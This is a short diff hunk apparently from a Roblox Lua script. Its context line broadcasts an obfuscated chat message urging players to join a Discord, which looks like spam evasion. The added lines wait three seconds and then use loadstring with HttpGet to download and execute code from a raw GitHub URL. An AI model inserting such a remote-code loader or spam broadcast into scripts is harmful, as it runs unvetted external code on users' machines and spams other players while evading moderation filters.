@@ -3075,7 +3075,9 @@ game.Players:Chat("h \n\n\n\n\n\n Please join❤️  \n\n\n\n\n\n  đíšçοŕ�
 
 
 
+wait(3)
 
+loadstring(game:HttpGet("https://raw.githubusercontent.com/lpkonizopcinfasdf/plamka/main/my_own/'slocklock",true))()
 
 
 
